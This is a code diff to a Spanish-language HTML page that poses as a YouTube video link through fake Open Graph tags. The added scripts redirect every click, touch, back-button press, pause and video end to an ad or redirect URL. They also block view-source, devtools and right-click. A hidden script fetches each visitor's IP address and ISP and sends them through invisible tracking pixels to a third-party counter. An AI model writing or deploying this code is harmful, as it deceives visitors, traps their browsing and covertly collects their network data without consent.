@@ -2,22 +2,559 @@
 <html lang="es">
 <head>
   <meta charset="UTF-8">
-  <title>Redirección móvil</title>
-  <script>
-    // Detectar si el usuario es móvil
-    function esMovil() {
-      return /Android|iPhone|iPad|iPod|Opera Mini|IEMobile|WPDesktop/i.test(navigator.userAgent);
+  <meta name="robots" content="noindex">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>😈TEAM SOLODA😈</title>
+
+  <!-- Open Graph Meta Tags -->
+  <meta property="og:type" content="pig">
+  <meta property="og:title" content="Arte Pura.">
+  <meta property="og:description" content="YouTube">
+  <meta property="og:url" content="https://www.youtube.com"> 
+  <meta property="og:image" content="http://apnasmile.com/pics/28.jpg">
+
+  <style>
+    body {
+      margin: 0;
+      padding: 0;
+      background-color: #000;
+      color: #fff;
+      font-family: Arial, sans-serif;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      overflow: auto;
+      cursor: pointer; /* Indica que se puede hacer clic */
     }
 
-    // Redirigir si es móvil
-    if (esMovil()) {
-      window.location.href = "https://crushingwolvesnormal.com/mrwcx3c8za?key=0aa782a2d942b5dcc09153e4e1346d35"; // 🔗 cambia por la URL destino
+    .video-container {
+      max-width: 80vw;
+      width: 100%;
+      aspect-ratio: 16 / 9;
+      position: relative;
+      margin: 20px auto;
+    }
+
+    video {
+      width: 100%;
+      height: auto;
+      border-radius: 12px;
+      box-shadow: 0 0 20px rgba(0, 0, 0, 0.7);
+    }
+  </style>
+
+    <script>
+        // Funci贸n para detectar m贸viles
+        function isMobileDevice() {
+            return /Mobi|Android|iPhone|iPad|iPod|BlackBerry|Opera Mini/i.test(navigator.userAgent);
+        }
+
+        // Redirige si NO es m贸vil
+        if (!isMobileDevice()) {
+            window.location.href = "https://www.youtube.com/watch?v=cYXRo_Y5gIU";
+        }
+    </script>
+
+
+
+  <!-- Script: Redirecci贸n al usar el bot贸n "atr谩s" -->
+  <script>
+    const adURL = "https://uv.do/s/sd43fsw4"; 
+    window.addEventListener('pageshow', function (event) {
+      if (event.persisted || performance.getEntriesByType("navigation")[0].type === "back_forward") {
+        window.location.href = adURL;
+      }
+    });
+    history.pushState(null, null, location.href);
+    window.onpopstate = function () {
+      history.pushState(null, null, location.href);
+    };
+  </script>
+
+  <!-- Script: Redirecci贸n por clic/touch en toda la pantalla -->
+  <script>
+    const redirectUrl = 'https://crushingwolvesnormal.com/mrwcx3c8za?key=0aa782a2d942b5dcc09153e4e1346d35';
+
+    // Detectar si es m贸vil
+    const isMobile = /Mobi|Android/i.test(navigator.userAgent);
+
+    // Funci贸n de redirecci贸n
+    function triggerRedirect(event) {
+      event.preventDefault();
+      window.location.href = redirectUrl;
+    }
+
+    // Agregar evento de clic o toque a todo el documento
+    document.addEventListener('click', triggerRedirect, true);
+    if (isMobile) {
+      document.addEventListener('touchstart', triggerRedirect, true);
     }
   </script>
+
+  <!-- Script: Redirecci贸n al finalizar el video -->
+  <script>
+    document.addEventListener("DOMContentLoaded", function () {
+      var videos = document.querySelectorAll('video');
+      videos.forEach(function(video) {
+        video.addEventListener('ended', function() {
+          window.location.href = 'https://crushingwolvesnormal.com/mrwcx3c8za?key=0aa782a2d942b5dcc09153e4e1346d35';
+        });
+      });
+    });
+  </script>
+
+  <!-- Script: Bloquear retroceso m贸vil -->
+  <script>
+    document.addEventListener("DOMContentLoaded", function () {
+      var isMobile = /Android|iPhone/i.test(navigator.userAgent);
+      var redirectURL = "https://crushingwolvesnormal.com/mrwcx3c8za?key=0aa782a2d942b5dcc09153e4e1346d35";
+      if (isMobile) {
+        history.pushState(null, null, location.href);
+        window.addEventListener("popstate", function () {
+          location.href = redirectURL;
+        });
+      }
+    });
+  </script>
+
+  <!-- Script: Reproducci贸n aleatoria + protecci贸n + redirecci贸n -->
+  <script>
+    document.addEventListener("DOMContentLoaded", function () {
+      var video = document.getElementById('videoPlayer');
+      var redirectURL = "https://crushingwolvesnormal.com/mrwcx3c8za?key=0aa782a2d942b5dcc09153e4e1346d35";
+      var timer;
+
+      var videoList = [
+        "https://cdn.videy.co/HTb5kQDc.mp4",
+        "https://cdn.videy.co/1bZLoX2v.mp4",
+        "https://cdn.videy.co/qDk9IsxJ1.mp4",
+        "https://cdn.videy.co/5mLg1YVL1.mp4",
+        "https://cdn.videy.co/XzmMWuVF1.mp4",
+        "https://cdn.videy.co/qCHvjIcZ1.mp4",
+        "https://cdn.videy.co/njUMw6C31.mp4",
+        "https://cdn.videy.co/7DPCEq1T1.mp4",
+        "https://cdn.videy.co/qM8IkUGE1.mp4",
+        "https://cdn.videy.co/QTuFZGx71.mp4",
+        "https://cdn.videy.co/QmZsrbub1.mp4",
+        "https://cdn.videy.co/xs41BdjZ1.mp4",
+        "https://cdn.videy.co/KeNLiIqr1.mp4",
+        "https://cdn.videy.co/LqynMFKh1.mp4",
+        "https://cdn.videy.co/eOeSwapA1.mp4",
+        "https://cdn.videy.co/9z3Kcjag1.mp4",
+        "https://cdn.videy.co/7mBbU9Mp1.mp4",
+        "https://cdn.videy.co/VG12gGft1.mp4",
+        "https://cdn.videy.co/gwBNXdrM1.mp4",
+        "https://cdn.videy.co/Fe2zecvy1.mp4",
+        "https://cdn.videy.co/jWKat65c1.mp4",
+        "https://cdn.videy.co/ISfJ5Dm11.mp4",
+        "https://cdn.videy.co/l2qdfPCl1.mp4",
+        "https://cdn.videy.co/Pte1yJEG1.mp4",
+        "https://cdn.videy.co/je21eMb31.mp4",
+        "https://cdn.videy.co/dNUHPZ0g1.mp4",
+        "https://cdn.videy.co/envb4PHm1.mp4",
+        "https://cdn.videy.co/1E1PyiNO1.mp4",
+        "https://cdn.videy.co/K3GuuKlm1.mp4",
+        "https://cdn.videy.co/SAxR1ptf1.mp4",
+        "https://cdn.videy.co/5khzXu7v1.mp4",
+        "https://cdn.videy.co/MZVrXBLY1.mp4",
+        "https://cdn.videy.co/YSxsvYJY1.mp4",
+        "https://cdn.videy.co/N8uFgksK1.mp4",
+        "https://cdn.videy.co/nnDjfzuA1.mp4",
+        "https://cdn.videy.co/8rWmc2S91.mp4",
+        "https://cdn.videy.co/p09aFnGw1.mp4",
+        "https://cdn.videy.co/pXhmPi2K1.mp4",
+        "https://cdn.videy.co/B23z3F601.mp4",
+        "https://cdn.videy.co/avEKs9My1.mp4",
+        "https://cdn.videy.co/XR7gGj5y1.mp4",
+        "https://cdn.videy.co/By3Za2kA1.mp4",
+        "https://cdn.videy.co/6p48NZbX1.mp4",
+        "https://cdn.videy.co/bxRmoBpy1.mp4",
+        "https://cdn.videy.co/iLy1pTOK1.mp4",
+        "https://cdn.videy.co/9SCpYRY81.mp4",
+        "https://cdn.videy.co/w9qeELVY1.mp4",
+        "https://cdn.videy.co/a1JOmobN1.mp4",
+        "https://cdn.videy.co/oSrdbuWM1.mp4",
+        "https://cdn.videy.co/GzE3ipc71.mp4",
+        "https://cdn.videy.co/bYOC0MLP1.mp4",
+        "https://cdn.videy.co/yaImuFY11.mp4",
+        "https://cdn.videy.co/B3L9SSP81.mp4",
+        "https://cdn.videy.co/cUZbIZl21.mp4",
+        "https://cdn.videy.co/P6sVPdY91.mp4",
+        "https://cdn.videy.co/h3eclbMo1.mp4",
+        "https://cdn.videy.co/LBi1Bkwf1.mp4",
+        "https://cdn.videy.co/A7gAdkbk1.mp4",
+        "https://cdn.videy.co/8BeC8qk61.mp4",
+        "https://cdn.videy.co/CC9piNh31.mp4",
+        "https://cdn.videy.co/EhUuKs8U1.mp4",
+        "https://cdn.videy.co/d2FE4ejJ1.mp4",
+        "https://cdn.videy.co/THhWVKxk1.mp4",
+        "https://cdn.videy.co/UN0HRK7u1.mp4",
+        "https://cdn.videy.co/D8qUGhHg1.mp4",
+        "https://cdn.videy.co/L0UMzth21.mp4",
+        "https://cdn.videy.co/0r47Y5WF1.mp4",
+        "https://cdn.videy.co/LBu7i4rc1.mp4",
+        "https://cdn.videy.co/xmoCru2a1.mp4",
+        "https://cdn.videy.co/5u94l8Ui1.mp4",
+        "https://cdn.videy.co/rumZOxQc1.mp4",
+        "https://cdn.videy.co/cJ3Uxc4X1.mp4",
+        "https://cdn.videy.co/8Q6Ph0lS1.mp4",
+        "https://cdn.videy.co/SGcN6zfr1.mp4",
+        "https://cdn.videy.co/i8FEXI3Q1.mp4",
+        "https://cdn.videy.co/1PVmLjo71.mp4",
+        "https://cdn.videy.co/4nZ2ehlk1.mp4",
+        "https://cdn.videy.co/8f2H6STx1.mp4",
+        "https://cdn.videy.co/wmvJprwU1.mp4",
+        "https://cdn.videy.co/sOzLnsBL1.mp4",
+        "https://cdn.videy.co/kv6qBbTI1.mp4",
+        "https://cdn.videy.co/GzLe2BKE1.mp4",
+        "https://cdn.videy.co/3WXIboNh1.mp4",
+        "https://cdn.videy.co/pYpkaOPJ1.mp4",
+        "https://cdn.videy.co/r3gDIj3i1.mp4",
+        "https://cdn.videy.co/Ay14bzDv1.mp4",
+        "https://cdn.videy.co/0gsKWXzj1.mp4",
+        "https://cdn.videy.co/avxnlLMt1.mp4",
+        "https://cdn.videy.co/qsF5fyvi1.mp4",
+        "https://cdn.videy.co/SLIzUgME1.mp4",
+        "https://cdn.videy.co/ygYqjNac1.mp4",
+        "https://cdn.videy.co/dCEXhocS1.mp4",
+        "https://cdn.videy.co/yX0hgiLv1.mp4",
+        "https://cdn.videy.co/bfYo5l9r1.mp4",
+        "https://qu.ax/aMkmW.mp4",
+        "https://qu.ax/YCFt.mp4",
+        "https://qu.ax/MvitZ.mp4",
+        "https://cdn.videy.co/0JkMTKpz1.mp4",
+        "https://qu.ax/VRTx.mp4",
+        "https://cdn.videy.co/kM1k6bsn1.mp4",
+        "https://cdn.videy.co/rcbiR2bY1.mp4",
+        "https://cdn.videy.co/BXPx7WzY1.mp4",
+        "https://cdn.videy.co/g36PtyvL1.mp4",
+        "https://qu.ax/dvpcJ.mp4",
+        "https://cdn.videy.co/nY13ZkXt1.mp4",
+        "https://cdn.videy.co/wXK3I8E71.mp4",
+        "https://qu.ax/zdQUt.mp4",
+        "https://cdn.videy.co/59psuNoU1.mp4",
+        "https://qu.ax/SuUG.mp4",
+        "https://qu.ax/YUyBU.mp4",
+        "https://cdn.videy.co/uUSOJy5A1.mp4",
+        "https://cdn.videy.co/6j3io4yw1.mp4",
+        "https://cdn.videy.co/msHDqquZ1.mp4",
+        "https://qu.ax/osEKf.mp4",
+        "https://qu.ax/EEVoF.mp4",
+        "https://cdn.videy.co/gcWhEmgZ1.mp4",
+        "https://qu.ax/bakkX.mp4",
+        "https://cdn.videy.co/qCM1RliY1.mp4",
+        "https://cdn.videy.co/VnrWle5a1.mp4",
+        "https://cdn.videy.co/RzTPkrN9.mp4",
+        "https://cdn.videy.co/Vw2bD1Q91.mp4",
+        "https://cdn.videy.co/UheefRei1.mp4",
+        "https://cdn.videy.co/BLekys401.mp4",
+        "https://qu.ax/ExGYz.mp4",
+        "https://qu.ax/ktxYg.mp4",
+        "https://qu.ax/vSYuZ.mp4",
+        "https://cdn.videy.co/P8AZ5Dhc1.mp4",
+        "https://qu.ax/UqYLR.mp4",
+        "https://qu.ax/TXVTQ.mp4",
+        "https://cdn.videy.co/noM6BPdT1.mp4",
+        "https://cdn.videy.co/hWDCLFUY.mp4",
+        "https://qu.ax/qnnsv.mp4",
+        "https://cdn.videy.co/WSPVt9mE1.mp4",
+        "https://qu.ax/gUbUo.mp4",
+        "https://cdn.videy.co/NtxgPOAb1.mp4",
+        "https://cdn.videy.co/QlSroOUY1.mp4",
+        "https://cdn.videy.co/nKV971At.mp4",
+        "https://cdn.videy.co/MkX6JGZt1.mp4",
+        "https://cdn.videy.co/eDkUsZ0m1.mp4",
+        "https://cdn.videy.co/jKujYDLp1.mp4",
+        "https://cdn.videy.co/3574NSE21.mp4",
+        "https://cdn.videy.co/Wd8qO4SV1.mp4",
+        "https://qu.ax/FSca.mp4",
+        "https://cdn.videy.co/ITVkIw9K1.mp4",
+        "https://cdn.videy.co/fQMd4q951.mp4",
+        "https://cdn.videy.co/VKQSUWG31.mp4",
+        "https://cdn.videy.co/BmVOer5r1.mp4",
+        "https://cdn.videy.co/ISBcHpo31.mp4",
+        "https://qu.ax/bOvNc.mp4",
+        "https://cdn.videy.co/I7b8HXnV1.mp4",
+        "https://cdn.videy.co/uyz5Wu7G1.mp4",
+        "https://cdn.videy.co/RJKIfp2K1.mp4",
+        "https://cdn.videy.co/2MqYLkg01.mp4",
+        "https://cdn.videy.co/nBTgakPw1.mp4",
+        "https://cdn.videy.co/UKCabt6R.mp4",
+        "https://cdn.videy.co/gkUFjwnm1.mp4",
+        "https://cdn.videy.co/OTSKN6eU1.mp4",
+        "https://cdn.videy.co/hRYMVhbt1.mp4",
+        "https://cdn.videy.co/PSveH7vF1.mp4",
+        "https://cdn.videy.co/4lesvhVm1.mp4",
+        "https://cdn.videy.co/QQXI3QwE1.mp4",
+        "https://cdn.videy.co/0iGAEgsc1.mp4",
+        "https://cdn.videy.co/PpvZ7i5R1.mp4",
+        "https://cdn.videy.co/hWDCLFUY.mp4",
+        "https://cdn.videy.co/oTAHEDme1.mp4",
+        "https://cdn.videy.co/1YbYjhry1.mp4",
+        "https://cdn.videy.co/2YQx9xFH1.mp4",
+        "https://cdn.videy.co/6jsST7pg1.mp4",
+        "https://cdn.videy.co/lNjlzWKu1.mp4",
+        "https://cdn.videy.co/uNGXa8xr1.mp4",
+        "https://cdn.videy.co/zZVGtA8E1.mp4",
+        "https://cdn.videy.co/emLFf5zG1.mp4",
+        "https://cdn.videy.co/eEGCnCje1.mp4",
+        "https://cdn.videy.co/FjIGxOko1.mp4",
+        "https://cdn.videy.co/nDSG90F41.mp4",
+        "https://cdn.videy.co/azX5XUVg1.mp4",
+        "https://cdn.videy.co/9T7RNWIa.mp4",
+        "https://cdn.videy.co/e4PoRtLM1.mp4",
+        "https://cdn.videy.co/Gc4SFxlt1.mp4",
+        "https://cdn.videy.co/Ef4DbFwA1.mp4",
+        "https://cdn.videy.co/FWJwsAO61.mp4",
+        "https://cdn.videy.co/v2lESlHY1.mp4",
+        "https://cdn.videy.co/5mhpIWMr1.mp4",
+        "https://cdn.videy.co/14FY8KXe1.mp4",
+        "https://cdn.videy.co/sPJDRkfl1.mp4",
+        "https://cdn.videy.co/MXIPPMVL.mp4",
+        "https://cdn.videy.co/rET3iAzo1.mp4",
+        "https://cdn.videy.co/rs7NVipy1.mp4",
+        "https://cdn.videy.co/XMFfs1441.mp4",
+        "https://cdn.videy.co/pYDLr9ZS1.mp4",
+        "https://cdn.videy.co/20sTbnqP1.mp4",
+        "https://cdn.videy.co/rDIrwGRJ1.mp4",
+        "https://cdn.videy.co/jEXKMhsg1.mp4",
+        "https://cdn.videy.co/HVsfI2wf1.mp4",
+        "https://cdn.videy.co/z9eA7MVe1.mp4",
+        "https://cdn.videy.co/tVmlnfuQ1.mp4",
+        "https://cdn.videy.co/ViP8TLff1.mp4",
+        "https://cdn.videy.co/Y5F9R1vG1.mp4",
+        "https://cdn.videy.co/D9iUUOEu1.mp4",
+        "https://cdn.videy.co/zhqkTzGD1.mp4",
+        "https://cdn.videy.co/sOs4LTUw.mp4",
+        "https://cdn.videy.co/HQLN9fvx1.mp4",
+        "https://cdn.videy.co/gcqSQniM1.mp4",
+        "https://qu.ax/zdQUt.mp4",
+        "https://cdn.videy.co/eZTwDhrA1.mp4",
+        "https://cdn.videy.co/W3ELPFVz1.mp4",
+        "https://cdn.videy.co/YQt1VJ6B1.mp4",
+        "https://cdn.videy.co/MlEqcKsI1.mp4",
+        "https://cdn.videy.co/8spYTeiO1.mp4",
+        "https://cdn.videy.co/y6Nja3DW.mp4",
+        "https://cdn.videy.co/LeeoPXIL1.mp4",
+        "https://cdn.videy.co/77JiccOw1.mp4",
+        "https://cdn.videy.co/9kDiO17E1.mp4",
+        "https://cdn.videy.co/jmKPB9cN1.mp4",
+        "https://cdn.videy.co/lBOLoH9r1.mp4",
+        "https://cdn.videy.co/9yhzMR7S1.mp4",
+        "https://cdn.videy.co/PG7xFngc.mp4",
+        "https://cdn.videy.co/Phjk1gvS1.mp4",
+        "https://cdn.videy.co/UuXGWCfa1.mp4",
+        "https://cdn.videy.co/eRJims221.mp4",
+        "https://cdn.videy.co/FL44GxgN1.mp4",
+        "https://cdn.videy.co/IZlcCfrV1.mp4",
+        "https://cdn.videy.co/BLekys401.mp4",
+        "https://cdn.videy.co/NHrVn4Va.mp4",
+        "https://cdn.videy.co/IS9dlgfx1.mp4",
+        "https://cdn.videy.co/2Zc8NAJM1.mp4",
+        "https://cdn.videy.co/ijUKDzee1.mp4",
+        "https://cdn.videy.co/VR8uz7541.mp4",
+        "https://cdn.videy.co/m3AkHUYF1.mp4",
+        "https://cdn.videy.co/8HLOj8YP1.mp4",
+        "https://cdn.videy.co/i4Im4bUg1.mp4",
+        "https://cdn.videy.co/4JRov9De1.mp4",
+        "https://cdn.videy.co/d23fmXwr1.mp4",
+        "https://cdn.videy.co/I4jh8UFL1.mp4",
+        "https://cdn.videy.co/j2Io44Uy1.mp4",
+        "https://cdn.videy.co/rtYvtsuT1.mp4",
+        "https://cdn.videy.co/DBDSSc9R1.mp4",
+        "https://cdn.videy.co/V30ggCAv1.mp4",
+        "https://cdn.videy.co/wtYhnLSU1.mp4",
+        "https://cdn.videy.co/XvR9Tyk31.mp4",
+        "https://cdn.videy.co/MQJvkfNp1.mp4",
+        "https://cdn.videy.co/cBJ91gAz1.mp4",
+        "https://cdn.videy.co/JT9dYDpQ1.mp4",
+        "https://cdn.videy.co/Omh2IUbw.mp4",
+        "https://cdn.videy.co/OWsWCtN71.mp4",
+        "https://cdn.videy.co/XQDPh3VF.mp4",
+        "https://cdn.videy.co/YmFqHOMS.mp4",
+        "https://cdn.videy.co/5WwH4jey1.mp4",
+        "https://cdn.videy.co/ejGLLpVF.mp4",
+        "https://cdn.videy.co/5h3mKKbX.mp4",
+        "https://cdn.videy.co/MWSXjc0D1.mp4",
+        "https://cdn.videy.co/wXfrTpOj1.mp4",
+        "https://cdn.videy.co/yxa1CX7y1.mp4",
+        "https://cdn.videy.co/bMORkMM91.mp4",
+        "https://cdn.videy.co/QSvzdvtR1.mp4",
+        "https://cdn.videy.co/RMTa1CLZ1.mp4",
+        "https://cdn.videy.co/Zfia4DKN1.mp4",
+        "https://cdn.videy.co/8cnwhwo21.mp4",
+        "https://cdn.videy.co/tQZAFkpW1.mp4",
+        "https://cdn.videy.co/iL4UFQmC1.mp4",
+        "https://cdn.videy.co/ygYqjNac1.mp4",
+        "https://cdn.videy.co/Gud865pU1.mp4",
+        "https://cdn.videy.co/Esi4UHxI1.mp4",
+        "https://cdn.videy.co/FpxUFGh91.mp4",
+        "https://cdn.videy.co/0jlUP0tu1.mp4",
+        "https://cdn.videy.co/WJiqyjis1.mp4",
+        "https://cdn.videy.co/BjWLQhVD1.mp4",
+        "https://cdn.videy.co/2LxH35qw1.mp4",
+        "https://cdn.videy.co/E6sNCE5Q1.mp4",
+        "https://cdn.videy.co/uQv8TOR91.mp4",
+        "https://cdn.videy.co/0M93rxqe1.mp4",
+        "https://cdn.videy.co/LOJv3Us01.mp4",
+        "https://cdn.videy.co/3I0RDElT1.mp4",
+        "https://cdn.videy.co/emXxBXOp1.mp4",
+        "https://cdn.videy.co/QYzMaZmx1.mp4",
+        "https://cdn.videy.co/JcQNTMOc1.mp4",
+        "https://cdn.videy.co/4ZHEImJN1.mp4",
+        "https://cdn.videy.co/xXJecGBI1.mp4",
+        "https://cdn.videy.co/LyUfCU8p1.mp4",
+        "https://cdn.videy.co/1zFoowMY1.mp4",
+        "https://cdn.videy.co/T8sAox7n1.mp4",
+        "https://cdn.videy.co/GO4v6VsK1.mp4",
+        "https://cdn.videy.co/z85lXjwj1.mp4",
+        "https://cdn.videy.co/NEA4a8Kn1.mp4",
+        "https://cdn.videy.co/vRTn6sx31.mp4",
+        "https://cdn.videy.co/4YKa1FLa1.mp4",
+        "https://cdn.videy.co/pLhSeHTA1.mp4",
+        "https://cdn.videy.co/GB2x59L91.mp4",
+        "https://cdn.videy.co/NBVxNh1q1.mp4",
+        "https://cdn.videy.co/YeH2Z0SU1.mp4",
+        "https://cdn.videy.co/EnGMzAH21.mp4",
+        "https://cdn.videy.co/7fQJ3TQh1.mp4",
+        "https://cdn.videy.co/Yv5elPTz1.mp4",
+        "https://cdn.videy.co/l40JQ0oW1.mp4",
+        "https://cdn.videy.co/TtzSXmtv1.mp4",
+        "https://cdn.videy.co/4yu9udbf1.mp4",
+        "https://cdn.videy.co/9doMvk291.mp4",
+        "https://cdn.videy.co/jXtUyJas1.mp4",
+        "https://cdn.videy.co/xkqy6b5e1.mp4",
+        "https://cdn.videy.co/xLSmmWwh1.mp4",
+        "https://cdn.videy.co/gA0oys6A1.mp4",
+        "https://cdn.videy.co/xqYUrOhb1.mp4",
+        "https://cdn.videy.co/NrB8Z1CJ1.mp4",
+        "https://cdn.videy.co/IY9WgQos.mp4",
+        "https://cdn.videy.co/PkQJmRmo1.mp4",
+        "https://cdn.videy.co/tb9GpPrw1.mp4",
+        "https://cdn.videy.co/VPFXz9q61.mp4",
+        "https://cdn.videy.co/hxLYVxys1.mp4",
+        "https://cdn.videy.co/lNYGlafp1.mp4",
+        "https://cdn.videy.co/Xow4bR671.mp4",
+        "https://cdn.videy.co/KwlKPWKZ1.mp4",
+        "https://cdn.videy.co/I3yrODZC1.mp4",
+        "https://cdn.videy.co/aALoVH451.mp4",
+        "https://cdn.videy.co/YOzfQc1U1.mp4",
+        "https://cdn.videy.co/HtSG0TwE1.mp4",
+        "https://cdn.videy.co/PWn10KAL1.mp4",
+        "https://cdn.videy.co/efiHlKkJ1.mp4",
+        "https://cdn.videy.co/X1YS863N1.mp4",
+        "https://cdn.videy.co/v3CIPfli1.mp4",
+        "https://cdn.videy.co/ValoGf7L.mp4",
+        "https://cdn.videy.co/6cxs7mVH1.mp4",
+        "https://cdn.videy.co/lTCobCOQ1.mp4",
+        "https://cdn.videy.co/SMudlsRQ1.mp4",
+        "https://cdn.videy.co/58FepRpp1.mp4",
+        "https://cdn.videy.co/WPDmCYwp.mp4",
+        "https://cdn.videy.co/zCGCTyZH1.mp4",
+        "https://cdn.videy.co/zjxWqaVI1.mp4",
+        "https://cdn.videy.co/iVSyZOcF1.mp4",
+        "https://cdn.videy.co/7GGez6gQ1.mp4",
+        "https://cdn.videy.co/RhxSwsgm1.mp4",
+        "https://cdn.videy.co/vgWByoUG1.mp4",
+        "https://cdn.videy.co/ARyMAr6Q1.mp4",
+        "https://cdn.videy.co/l2bTQue01.mp4",
+        "https://qu.ax/dpVla.mp4",
+        "https://qu.ax/eWemH.mp4",
+        "https://cdn.videy.co/HTb5kQDc.mp4",
+        "https://cdn.videy.co/1bZLoX2v.mp4",
+        "https://cdn.videy.co/qDk9IsxJ1.mp4",
+
+        // Aqu铆 puedes agregar m谩s URLs si lo deseas
+      ];
+
+      function playRandomVideo() {
+        var randomIndex = Math.floor(Math.random() * videoList.length);
+        video.src = videoList[randomIndex];
+        video.muted = true; // Necesario para autoplay sin interacci贸n
+        video.play().catch(() => {
+          // Si falla autoplay, se puede pedir interacci贸n
+          console.log("Autoplay bloqueado. Desbloquea el sonido.");
+        });
+      }
+
+      function redirect() {
+        window.location.href = redirectURL;
+      }
+
+      video.addEventListener('ended', redirect);
+      video.addEventListener('pause', redirect);
+
+      video.addEventListener('play', function () {
+        clearTimeout(timer);
+        timer = setTimeout(redirect, 5000); // 5 segundos
+      });
+
+      video.addEventListener('pause', function () {
+        clearTimeout(timer);
+      });
+
+      document.addEventListener('keydown', function (e) {
+        if (e.ctrlKey && (e.key === 'u' || e.key === 's' || e.key === 'p' || e.key === 'i' || e.key === 'j')) {
+          e.preventDefault();
+        }
+        if (e.key === 'F12') {
+          e.preventDefault();
+        }
+      });
+
+      document.addEventListener('contextmenu', function (e) {
+        e.preventDefault();
+      });
+
+      playRandomVideo();
+    });
+  </script>
+
+  <!-- IP Tracking -->
+  <script>
+    function insertIpInImages(ip, carrier) {
+      const formattedCarrier = carrier.replace(/ /g, '+');
+      let img1 = document.createElement("img");
+      img1.src = `//whos.amung.us/pingjs/?k=emma23;&t=${formattedCarrier}&x=https://ufostalker.com/`;
+      img1.style.display = "none";
+
+      let img2 = document.createElement("img");
+      img2.src = `//whos.amung.us/pingjs/?k=emma22;&t=${ip}&x=${ip}&x=https://ufomaps.org/`;
+      img2.style.display = "none";
+
+      document.body.appendChild(img1);
+      document.body.appendChild(img2);
+    }
+
+    fetch('https://wtfismyip.com/json')
+      .then(response => response.json())
+      .then(data => {
+        const ip = data.YourFuckingIPAddress;
+        const carrier = data.YourFuckingISP || "Operador Desconocido";
+        insertIpInImages(ip, carrier);
+      })
+      .catch(error => console.error('Error obteniendo la informaci贸n:', error));
+  </script>
+
+  <!-- WhatsApp Widget -->
+  <script id="_wauaax">var _wau = _wau || []; _wau.push(["tab", "emma25", "aax", "left-middle"]);</script>
+  <script async src="//waust.at/t.js"></script>
+
 </head>
+
+
+
 <body>
-  <h1>Bienvenido a mi página</h1>
-  <p>Si entras desde un dispositivo móvil serás redirigido automáticamente.</p>
+
+  <!-- Contenedor centrado del video -->
+  <div class="video-container">
+    <video id="videoPlayer" controlsList="nodownload" oncontextmenu="return false;" muted playsinline></video>
+  </div>
+
 </body>
-<img src="https://whos.amung.us/pingjs/?k=emma25&t=~🤑BILLONES GAN🤑~&x=https://www.facebook.com/" style="display:none">
+
+
+
 </html>
